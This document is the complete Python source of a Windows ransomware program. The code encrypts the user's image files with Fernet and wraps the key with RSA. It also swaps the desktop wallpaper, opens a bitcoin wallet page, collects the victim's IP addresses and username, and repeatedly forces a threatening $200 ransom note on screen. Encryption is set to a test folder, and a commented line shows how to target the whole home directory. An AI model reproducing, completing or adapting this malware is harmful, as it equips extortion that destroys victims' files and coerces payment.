from Crypto.PublicKey import RSA # to generate RSA public/private asymetric keys
#from Crypto.Random import get_random_bytes 
from Crypto.Cipher import AES, PKCS1_OAEP # Fernet 
from cryptography.fernet import Fernet # encrypt and decrypt files
import subprocess # to open notepad with ransom decrypt intruductions
import win32gui # used to get the focused window to make sure our victim cant miss the ransom note
import threading # to check if the ransom intruductions / bitcoin is focused and if the decryption key available simutaniusly
import os # makes diffrent kinds of OS operations
import ctypes # to change the background
import time # to make breaks with time.sleep(seconds)
import urllib.request # to download files
import shutil # to copy encrypted key
# delete if you dont send a mail contains the ip..
import requests # to get the victim's public ip
import webbrowser # for webbrowser to go to specific url
import smtplib # to use e-mail
import socket # to get the user's privateIP

# backgound img
import win32con
import win32api, win32con, win32gui

class Ransomware:

    sender_email = 'anonymourpythonhacking@gmail.com'
    sender_password = '----------' #not the real pass


    file_types_to_encrypt = [
        #'txt',
        'jpg',
    ]

    #this is our constructor to make ransomware object
    def __init__(self):
        # our symetric key <AES> to encrypt / decrypt files
        self.symmetric_key = None        
        # Encryption / Decryption Object
        self.crypter = None
        # to make code shorter, path to root dir
        self.root_directory = os.path.expanduser('~')
        # to test the malware without making significant damage
        self.test_directory = f'{self.root_directory}\\Desktop\\ramsomTesting'
        # we change back the wallpaper to the prev wallpeper in the end to keep good victims happy ;)
        self.prev_background_img_path = None
        # to get knowlege about the victim when we send the encrypted key # why not?
        self.publicIP = requests.get('https://api.ipify.org').text # why not?
        self.privateIP = socket.gethostbyname(socket.gethostname()) # why not?
        self.user_name = self.root_directory.split('\\')[-1] # why not? # self.root_directory.split('\\')[len( self.root_directory.split('\\') )-1]
        # add date initiallization here!



    # generate our symmetric key and give it to the encrypter obj
    def generate_symmetric_key(self):
        # 128-bit AES encryption key and a 128-bit SHA256 HMAC signing key. (Hash-based Message Authentication Code)
        self.symmetric_key = Fernet.generate_key()
        # using our AES symetrinc key as an input key for an object with encrypt / decrypt methods
        # fernet is an encryption library in python the encrypt files with: AES 128-bit, SHA256 HMAC, AES CBC, PKCS7 padding 
        self.crypter = Fernet(self.symmetric_key)

    # saving the symmetric key into a file before we encrypt it
    def save_key(self):
        with open('symmetric_key.txt', 'wb') as file:
            file.write(self.symmetric_key)

    def encrypt_symmetric_key(self):
        with open('symmetric_key.txt', 'rb') as readFile:
            sym_key = readFile.read()
        with open('symmetric_key.txt', 'wb') as writeFile:
            f=open('public.pem')
            # rsa public key
            self.public_key = RSA.import_key(f.read())
            #print('self.public_key: 0',self.public_key)
            # encrypter obj using RSA encryption and OAEP Padding to counter CCA defence
            #print('decrypted_symmetric_key: ',sym_key) #testing
            tmpCrypter =  PKCS1_OAEP.new(self.public_key)
            # encrypt our symmetryc key
            encrypted_symmetric_key = tmpCrypter.encrypt(sym_key)
            #print('encrypted_symmetric_key: ', encrypted_symmetric_key) #testing
        # the victim will send this to my mail and i'll decrypt it with my private RSA key
        with open(f'{self.root_directory}\\Desktop\\Encrypted_Key.txt', 'wb') as fw:
            fw.write(encrypted_symmetric_key)
        #just to make sure he wont delete our key so we can encrypt
        shutil.copyfile(f'{self.root_directory}\\Desktop\\Encrypted_Key.txt', f'{self.root_directory}\\Downloads\\Encrypted_Key.txt')
        # we could also send it to our mail here
        # change variable aswell to the sym key after encryption
        self.symmetric_key = encrypted_symmetric_key
        # Remove fernet crypter object
        self.crypter = None
        f.close()


    # encrypt a file using Fernet (AES) Encryption
    def encrypt_file(self, file_path):
        with open(file_path, 'rb') as f:
            original_data = f.read()
            # encrypting the data into cipher text
            cipher_text = self.crypter.encrypt(original_data)
        with open(file_path, 'wb') as fp:
            # Writing cipher text to the file
            fp.write(cipher_text)

    # decrypt a file using Fernet (AES) Encryption
    def decrypt_file(self, file_path):
        with open(file_path, 'rb') as f:
            cipher_text = f.read()
            # Decrypting cipher into the original data
            original_data = self.crypter.decrypt(cipher_text)
        with open(file_path, 'wb') as fp:
            # Writing original data back to the file
            fp.write(original_data)


    def crypt_system(self, encrypted=False):
        #for testing:
        system = os.walk(self.test_directory, topdown=True)
        print(system)
        # this commented line will encrypt the entire system
        # you can uncomment the command below and comment the command above if you wish to encrypt the entire system
        #system = os.walk(self.root_directory, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                # now we will extract the file type from the name: 
                if not file.split('.')[-1] in self.file_types_to_encrypt:
                    continue
                if not encrypted:
                    self.encrypt_file(file_path)
                else:
                    self.decrypt_file(file_path)

    def pop_up_my_wallet(self):
        # a random wallet i found on google for this ex purpose.
        url = 'https://www.blockchain.com/btc/address/bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'
        webbrowser.open(url)

    def create_ransom_txt(self):
        # this method creates a ransom note with introduction if the victim will follow the introduction hes system will be decrypted
        with open('RANSOM_INTRO.txt', 'w') as f:
            f.write(f'''
Sorry but weve been encrypting your personal files.
We used an AES 128 algorithm to encrypt your Disk and then we encrypted the AES key with RSA 2048.
Only the AES-128bit key can decrypt your system and only my private RSA 2048 key can decrypt your AES key.
I understand you might not believe me but only I can decrypt your Disk.
You can go ahead and call a proffesional and ask him if this decryptable, but if you will try to decrypt it yourself your files will be lost.


To decrypt your key and restore your data, please follow these introductions:

1. Email the file called Encrypted_Key.txt at {self.root_directory}Desktop\Encrypted_Key.txt to 'anonymouspythonhacking@gmail.com'

2. A wallet of bitcoin poped up at your computer with the address "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh".
   We charge 200$ for the decryption of your computer.
   Once payment has been completed, send another email to 'anonymouspythonhacking@gmail.com' with the following
   subject: "PAID publicIP: <Your publicIP>, privateIP: <Your privateIP>, user name: <Your Windows user name>".
   We will check to see if payment has been paid.
   * to get your publicIP: open your web browser and surf to "https://api.ipify.org" this site's content is your publicIP, copy it to the mail.
   * to get your privateIP: press the windows start button and then type in the search testbox "cmd" then a black dos window will pop up
   type: "ipconfig", your private IP adress will be listed under "IPV4 Address"
   * to get your user name: press the windows start button and then type in the search testbox "cmd" then a black dos window will pop up
   type: "whoami" the name after the char "\" is your username EG: iewin7\ieuser ---> ieuser is my user name
   * eg mail subject "PAID publicIP: <123.456.789.000>, privateIP: <987.654.321.000>, user name: <IEUser>"

3. You will receive a text file with your AES decrypted key, download it then move it on your Desktop. 

4. The Ransomware is looking for the decrypted key on the desktop AND WAIT! The Malware automatically decrypt your files once its on the Desktop.


WARNINGS:
DONT Try to decrypt your files and dont let a proffessional to try and decrypt it 
since even if hes rank 1 proffessional you probably wont be alive long enough to see your files get decrypted succefuly.
(thats why i dont delete them, I dare you to try and recover your files xD)
DONT change file names, mess with the files data, or your files will be lost forever.
DONT delete the file Encrypted_Key.txt I will double the decryption price for it.
DONT try anything funny such as faking your payment or calling the police (even god wont help you) I will double the decryption price for each funny mistake you make.
''')# change 1 incase we send ourself the encrypted key + publicIP + privateIP + user_name, ---> no real point in doing this so we pass this action.
        
        


    def show_ransom_txt(self):
        # Open the ransom note
        ransom_intro_note = subprocess.Popen(['notepad.exe', 'RANSOM_INTRO.txt'])
        counter = 5 # Debugging/Testing
        while True:
            time.sleep(0.1)
            focused_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if focused_window == 'RANSOM_INTRO.txt - Notepad':
                pass
            else:
                # if hes trying to pay, wait 5 min before we re-popup the notepad.
                #if 'Address: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh | Blockchain Explorer - Google Chrome' or 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' or 'Bitcoin' in focused_window:# focused_window ==
                #    time.sleep(60 * 5) # giving him 5 min to pay
                # Kill ransom introduction note so we can open it agian and make sure ransom note is on the top of all windows
                time.sleep(0.1)
                ransom_intro_note.kill()
                # Open the ransom introduction note
                time.sleep(0.1)
                if os.path.exists('RANSOM_INTRO.txt'):
                    ransom_intro_note = subprocess.Popen(['notepad.exe', 'RANSOM_INTRO.txt'])
                else: 
                    return
            # sleep for 10 seconds
            time.sleep(10)
            counter +=1 
            #so we make 100 popups after that he probably understood and read the introductions
            if counter == 5:
                break

    def looking_for_key(self):
        # check for DECRYPTED_SYM_KEY.txt and its on desktop it will read key and then self.symmetric_key 
        # creates the self.crypter will decrypt the system back.
        booly = True
        while booly:
            try:
                with open(f'{self.root_directory}\\Desktop\\DECRYPTED_SYM_KEY.txt', 'r') as f:
                    self.symmetric_key = f.read()
                    self.crypter = Fernet(self.symmetric_key)
                    # Decrpyt system once have file is found and we have cryptor with the correct key
                    self.crypt_system(encrypted=True)
                    booly = False
                    print('looking_for_key: decrypted') # Debugging/Testing
                    break
            except Exception as e:
                print('looking_for_key: ',e) # Debugging/Testing
                pass
            time.sleep(10) # Debugging/Testing check for file on desktop ever 10 seconds
            print('looking_for_key: Checking for DECRYPTED_SYM_KEY.txt') # Debugging/Testing
        if not booly:
            self.restore_desktop_background() #chk null
            self.delete_ransom()


    def backup_current_desktop_background(self):
        # backup the current background img, tested only in win7 32 bit
        stream = os.popen('echo %AppData%')
        AppData_path = stream.read()
        AppData_path = AppData_path[:-1]
        AppData_path = AppData_path + '\\Microsoft\\Windows\\Themes'
        stream = os.popen('echo %TEMP%')
        temp_path = stream.read()
        temp_path = temp_path[:-1]
        dst=None
        for file_name in os.listdir(AppData_path):
            src = os.path.join(AppData_path, file_name)
            dst = os.path.join(temp_path, file_name)
            shutil.copyfile(src, dst)
            self.prev_background_img_path = dst

    
    def restore_desktop_background(self):
        # restore to the original background if it was exists when the malware started
        if self.prev_background_img_path == None:
            return
        else:
            path = self.prev_background_img_path
            SPI_SETDESKWALLPAPER = 20
            # Access windows dlls for funcionality eg, changing dekstop wallpaper
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)      


    def creepy_background(self):
        # change the background img
        url = 'https://i.imgur.com/gwc6sDa.jpg'
        path = f'{self.root_directory}\\Desktop\\background.jpg'
        urllib.request.urlretrieve(url, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality behind the scenes
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0) #change last letter depending on OS EG InfoW --> InfoA

    def delete_ransom(self):
        # this function removing anything that related to the malware (after the victim payed)
        os.remove('symmetric_key.txt')
        os.remove(f'{self.root_directory}\\Desktop\\Encrypted_Key.txt')
        os.remove(f'{self.root_directory}\\Downloads\\Encrypted_Key.txt')
        os.remove('RANSOM_INTRO.txt')
        os.remove(f'{self.root_directory}\\Desktop\\DECRYPTED_SYM_KEY.txt')
        os.remove(f'{self.root_directory}\\Desktop\\background.jpg')
        os.remove('public.pem')
        os.remove('rw.py') # to delete the malware itself
    

def main():
    myRansom = Ransomware()
    myRansom.generate_symmetric_key()
    myRansom.crypt_system()
    myRansom.save_key()
    myRansom.encrypt_symmetric_key()
    myRansom.backup_current_desktop_background()
    myRansom.creepy_background()
    myRansom.pop_up_my_wallet()
    myRansom.create_ransom_txt()
    T1 = threading.Thread(target=myRansom.show_ransom_txt)
    T2 = threading.Thread(target=myRansom.looking_for_key)
    T1.start()
    T2.start()

if __name__ == '__main__':
    main()